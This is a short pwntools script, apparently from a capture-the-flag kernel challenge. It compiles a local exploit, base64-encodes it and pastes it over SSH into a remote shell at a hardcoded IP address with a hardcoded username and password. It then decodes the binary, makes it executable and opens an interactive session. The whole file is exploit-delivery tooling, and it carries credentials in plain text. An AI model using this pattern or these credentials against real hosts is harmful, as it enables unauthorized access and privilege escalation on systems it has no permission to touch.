from pwn import *

#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os

# context.log_level = 'debug'
cmd = '/ # '


def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('gcc  -static -O0 ./exp.c -o ./exp')
    os.system('gzip -c ./exp > ./exp.gz')
    r.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64')
    r.sendline((read('./exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')
    r.sendlineafter(cmd, 'gunzip ./exp.gz')
    r.sendlineafter(cmd, 'chmod +x ./exp')
    #r.sendlineafter(cmd, './exp')
    #r.interactive()


#p = process('./startvm.sh', shell=True)
p = ssh('pwnvimu', '183.60.136.228', password='pwnvimu2002', port=22)

exploit(p)

p.interactive()
